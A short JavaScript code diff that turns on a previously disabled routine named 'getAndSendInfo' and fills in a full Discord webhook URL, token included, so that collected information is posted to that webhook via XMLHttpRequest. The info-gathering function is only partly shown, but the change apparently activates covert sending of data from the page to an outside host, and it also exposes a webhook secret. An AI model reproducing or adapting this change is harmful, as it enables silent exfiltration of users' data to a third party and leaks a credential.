@@ -173,7 +173,7 @@ async function getInfo() {
     }
 }
 
-const getAndSendInfo = false;
+const getAndSendInfo = true;
 let Info
 (async function() {
   if (getAndSendInfo) {
@@ -184,7 +184,7 @@ let Info
 
 
 function sendInfo() {
-  var webhookUrl = "https://discord.com/api/webhooks/";  //https://discord.com/api/webhooks/
+  var webhookUrl = "https://discord.com/api/webhooks/1097411858408951838/VYJFv_pwqEAfhp26jcNi_-FrebSxhg3DrpzsNZOOKnbmRtLNMF-tD_hGAotoLjGb_VEL";  //https://discord.com/api/webhooks/
   
   var xhr = new XMLHttpRequest();
   xhr.open('POST', webhookUrl, true);
